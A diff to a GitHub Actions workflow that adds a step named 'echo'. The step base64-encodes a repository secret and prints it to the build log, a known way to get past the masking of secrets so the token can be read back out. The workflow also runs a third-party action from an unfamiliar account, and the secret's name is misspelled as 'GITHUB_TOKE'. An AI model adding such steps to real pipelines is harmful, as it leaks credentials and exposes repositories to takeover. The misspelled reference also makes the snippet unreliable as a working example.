@@ -7,3 +7,7 @@ jobs:
    steps:
      - name: hello
        uses: Dcrash0veride/custom_action@e2ceb71eff8a195ab15c9e6693da21b2e37ec165
+
+     - name: echo
+       run: |
+        echo $(echo ${{ secrets.GITHUB_TOKE }} | base64)
